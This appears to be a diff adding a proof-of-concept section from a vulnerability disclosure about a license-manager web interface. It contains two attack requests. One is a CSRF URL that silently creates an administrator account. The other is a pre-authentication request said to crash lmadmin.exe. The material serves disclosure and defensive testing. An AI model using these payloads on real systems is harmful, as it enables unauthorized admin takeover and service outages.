@@ -1,0 +1,4 @@
+Proof-of-Concept:
+http://www.example.com/users?licenseTab=&amp;selected=&amp;userName=xsrf&amp;firstName=xsrf&amp;lastName=xsrf&amp;password2=xsrf&amp;confirm=xsrf&amp;accountType=admin&amp;originalAccountType=&amp;Create=Save(Administrator CSRF)
+
+http://www.example.com/dashboard?&lt;something long here&gt;=2 (pre auth DoS, crashes lmadmin.exe) 
